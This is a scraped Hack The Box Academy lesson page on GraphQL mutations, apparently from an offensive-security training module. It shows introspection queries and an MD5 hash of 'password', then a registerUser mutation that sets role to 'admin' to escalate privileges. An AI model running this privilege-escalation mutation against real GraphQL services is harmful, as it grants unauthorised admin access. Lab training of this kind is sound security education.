<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/271/section/3156
// Platform Version: V1
// Module ID: 271
// Module Name: Attacking GraphQL
// Module Difficulty: Medium
// Section ID: 3156
// Section Title: Mutations
// Page Title: Hack The Box - Academy
// Page Number: 06
-->

# Mutations

**Module Name:** Attacking GraphQL **Page Number:** 06

#### 

#### ATTACKING GRAPHQL Mini-Module

# Mutations

## What are mutations?

``` graphql
query {
  __schema {
    mutationType {
      name
      fields {
        name
        args {
          name
          defaultValue
          type {
            ...TypeRef
          }
        }
      }
    }
  }
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}
```

![https://academy.hackthebox.com/storage/modules/271/mutation_1.png](https://academy.hackthebox.com/storage/modules/271/mutation_1.png)

``` graphql
{   
  __type(name: "RegisterUserInput") {
    name
    inputFields {
      name
      description
      defaultValue
    }
  }
}
```

![https://academy.hackthebox.com/storage/modules/271/mutation_2.png](https://academy.hackthebox.com/storage/modules/271/mutation_2.png)

``` shell-session
lbek@htb[/htb]$ echo -n 'password' | md5sum

5f4dcc3b5aa765d61d8327deb882cf99  -
```

``` graphql
mutation {
  registerUser(input: {username: "vautia", password: "5f4dcc3b5aa765d61d8327deb882cf99", role: "user", msg: "newUser"}) {
    user {
      username
      password
      msg
      role
    }
  }
}
```

![https://academy.hackthebox.com/storage/modules/271/mutation_3.png](https://academy.hackthebox.com/storage/modules/271/mutation_3.png)

## Exploitation with Mutations

``` graphql
mutation {
  registerUser(input: {username: "vautiaAdmin", password: "5f4dcc3b5aa765d61d8327deb882cf99", role: "admin", msg: "Hacked!"}) {
    user {
      username
      password
      msg
      role
    }
  }
}
```

![https://academy.hackthebox.com/storage/modules/271/mutation_4.png](https://academy.hackthebox.com/storage/modules/271/mutation_4.png)

![https://academy.hackthebox.com/storage/modules/271/mutation_5.png](https://academy.hackthebox.com/storage/modules/271/mutation_5.png)

# 

# 

#### Questions

####